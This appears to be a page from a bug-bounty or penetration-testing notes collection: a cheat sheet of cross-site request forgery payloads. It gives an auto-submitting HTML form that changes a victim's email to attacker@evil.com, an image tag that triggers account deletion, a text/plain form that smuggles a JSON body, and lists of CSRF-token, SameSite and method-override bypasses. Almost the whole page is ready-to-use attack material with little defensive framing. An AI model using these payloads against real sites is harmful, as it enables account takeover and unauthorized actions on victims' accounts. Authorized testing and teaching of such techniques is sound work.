---
title: "Payloads: CSRF"
type: payloads
tags: [payloads, csrf, access-control, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-06-16
---

# Payloads: CSRF

Cross-site request forgery + token/SameSite bypass (OWASP A01). Routed via the `hunt-auth` skill. See [[csrf]].

## Basic PoC (auto-submit)
```html
<form action="https://t/account/email" method="POST" id="f">
  <input name="email" value="attacker@evil.com">
</form><script>f.submit()</script>
<!-- GET: --> <img src="https://t/account/delete?id=1">
```

## Token bypass
```
remove the csrf_token param entirely             (often not enforced)
send an empty token   csrf_token=
use your own valid token on the victim (token not bound to session)
reuse an old/another-user's token
change method POST->GET (token only checked on POST)
guessable/static token; token in URL leaks via Referer
```

## Content-Type / JSON CSRF
```
# if endpoint accepts form-encoded too:
<form enctype="text/plain" action="https://t/api"><input name='{"email":"a@evil.com","x":"' value='"}'></form>
# Content-Type swap application/json -> text/plain / multipart to dodge the JSON check
# Flash/CORS-preflight-free simple requests only (GET/POST text/plain)
```

## SameSite bypass
```
SameSite=Lax: top-level GET navigation still sends cookie -> use a GET state-change or method override (_method=PUT)
new cookie within 2 min (Chrome "Lax+POST") window
sibling subdomain (XSS on sub.t.com) -> same-site request
no SameSite attr + old browser -> classic CSRF
```

## Method override / chaining
```
_method=DELETE   X-HTTP-Method-Override: PUT   ?_method=PUT
clickjacking the state-change (if no frame headers) -> see clickjacking
login CSRF: log victim into attacker account -> capture their activity
```

## Real-world
CSRF on email/password change = account takeover; SameSite-Lax + a GET state-change, and JSON endpoints that also accept form bodies, are the recurring bypasses in bug bounty.
